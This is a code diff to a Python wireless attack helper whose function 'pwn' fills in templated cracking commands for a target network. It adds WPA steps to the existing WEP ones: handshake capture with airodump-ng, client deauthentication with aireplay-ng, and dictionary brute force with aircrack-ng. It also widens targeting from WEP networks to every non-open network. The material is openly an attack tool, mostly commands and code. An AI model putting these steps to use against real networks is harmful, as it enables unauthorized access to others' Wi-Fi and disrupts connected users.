@@ -61,7 +61,8 @@ def pwn(interface, network):
 	os.system("ifconfig %s up" % interface)
 	os.system("iwconfig %s" % interface)
 	
-	instructions = """
+	if network["Encryption"].startswith("WEP"):
+		instructions = """
 == Get Deauthetication Packets (Fake Authentication) ==
 aireplay-ng -1 0 -e 'NAME' -a BSSID -h MAC INTERFACE
 OR
@@ -93,6 +94,19 @@ aireplay-ng -2 -r arp-request INTERFACE
 == Analyze ==
 aircrack-ng -z -b BSSID output*.cap
 """
+	elif network["Encryption"].startswith("WPA"):
+		instructions = """
+== Collect 4-way Authentication Handshake ==
+airodump-ng -c CHANNEL --bssid BSSID -w psk INTERFACE
+
+== Deauthenticate Wireless Client (optional) ==
+aireplay-ng -0 1 -a BSSID -c CLIENT wlan0
+
+== Brute Force ==
+cat /usr/share/dict/* | aircrack-ng -w - -b BSSID psk*.cap
+"""
+	else:
+		instructions = "Wrong encryption type"
 
 	instructions = instructions.replace("NAME", network["Name"]).replace("BSSID", network["Address"]).replace("MAC", mac).replace("INTERFACE", interface).replace("CHANNEL", network["Channel"])
 	proc = subprocess.Popen("less", stdin=subprocess.PIPE)
@@ -236,7 +250,7 @@ def main():
 	sort_cells(parsed_cells)
 	encrypted_cells = []
 	for cell in parsed_cells:
-		if cell["Encryption"] == "WEP":
+		if cell["Encryption"] != "Open":
 			encrypted_cells.append(cell)
 	
 	print_cells(encrypted_cells)
